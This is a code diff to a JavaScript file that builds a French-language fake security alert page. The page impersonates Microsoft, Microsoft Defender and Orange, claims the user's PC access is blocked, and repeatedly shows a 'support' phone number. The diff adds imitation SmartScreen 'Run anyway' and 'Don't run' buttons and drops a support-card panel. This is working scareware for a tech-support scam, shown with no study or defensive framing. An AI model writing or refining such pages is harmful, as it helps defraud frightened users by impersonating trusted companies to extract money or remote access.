@@ -5,7 +5,7 @@
   if (!document.querySelector('link[href*="styles.css"]')) {
     var styleLink = document.createElement("link");
     styleLink.rel = "stylesheet";
-    styleLink.href = "styles.css?v=10";
+    styleLink.href = "styles.css?v=11";
     document.head.appendChild(styleLink);
   }
 
@@ -26,6 +26,7 @@
     '<p class="browser-chrome-warning">Appellez le support technique Microsoft</p>' +
     '<p class="browser-chrome-phone">+33 02 59 50 90 20</p>' +
     '</div></div>' +
+    '<div class="security-main-panel">' +
     '<div class="security-page">' +
     '<section class="access-modal" aria-label="Alerte acces bloque">' +
     '<p>L\'accès à votre pc a été bloqué pour des raisons de sécurité.</p>' +
@@ -37,6 +38,10 @@
     '<p>Windows Support : +33 02 59 50 90 20</p>' +
     '<p class="black-modal-defender">Microsoft Defender</p>' +
     '</div>' +
+    '<div class="smartscreen-actions" aria-hidden="true">' +
+    '<button type="button" class="smartscreen-btn smartscreen-btn-run">Run anyway</button>' +
+    '<button type="button" class="smartscreen-btn smartscreen-btn-deny">Don\'t run</button>' +
+    '</div></div></div>' +
     '<section class="scan-modal scan-modal-hidden" aria-label="Support technique Microsoft" aria-hidden="true">' +
     '<h2 class="scan-modal-title">Désolé, l\'analyse n\'est pas terminée !</h2>' +
     '<p class="scan-modal-text">Une anomalie a été détectée sur votre appareil. Appellez l\'assistance Orange pour une analyse complète et sécuriser votre connexion.</p>' +
@@ -46,13 +51,7 @@
     '<button class="scan-btn scan-btn-now" type="button">Analyser maintenant</button>' +
     '<button class="scan-btn scan-btn-later" type="button">Analyser plus tard</button>' +
     '</div>' +
-    '</section>' +
-    '</div>' +
-    '<aside class="support-card" aria-label="Support technique Microsoft">' +
-    '<p class="support-card-subtitle">Support technique Microsoft</p>' +
-    '<p class="support-card-phone">+33 02 59 50 90 20</p>' +
-    '<p class="support-card-label">Numero</p>' +
-    '<div class="support-card-arrow" aria-hidden="true">▼</div></aside></div>' +
+    '</section></div>' +
     '<div class="home-page">' +
     '<main class="screen">' +
     '<div class="fb-desktop-bg" aria-hidden="true">' +
